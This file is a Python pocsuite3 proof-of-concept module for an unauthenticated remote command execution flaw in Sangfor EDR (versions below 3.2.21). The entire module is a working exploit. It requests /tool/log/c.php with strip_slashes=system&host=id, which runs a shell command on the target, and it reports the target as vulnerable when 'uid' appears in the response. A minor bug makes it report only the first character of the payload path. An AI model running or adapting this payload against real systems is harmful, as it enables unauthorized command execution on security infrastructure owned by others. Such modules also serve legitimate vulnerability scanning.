from collections import OrderedDict
from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
import sys
import re
import requests

class DemoPOC(POCBase):
    vulID = '深信服EDR'
    version = '1.0'
    author = ['**']
    vulDate = '2020-8-17'
    createDate = '2020-8-17'
    updateDate = '2020-8-17'
    references = ['*']
    name = '深信服 edr rce'
    appPowerLink = ''
    appName = '深信服edr远程命令执行漏洞'
    appVersion = 'eda<EDR3.2.21'
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS
    desc = '''edr'''
    samples = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _check(self,url):
        flag = r"uid"
        payloads = [
            r"/tool/log/c.php?strip_slashes=system&host=id"
        ]
        for payload in payloads:
            vul_url = url + payload
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            r = requests.get(vul_url, headers=headers)
            pattern = re.compile(flag)
            result1 = pattern.findall(r.text)
            if(len(result1) >1):
                return payload
        return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
        return self.parse_output(result)


    def _attack(self):
        return self._verify()


    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)
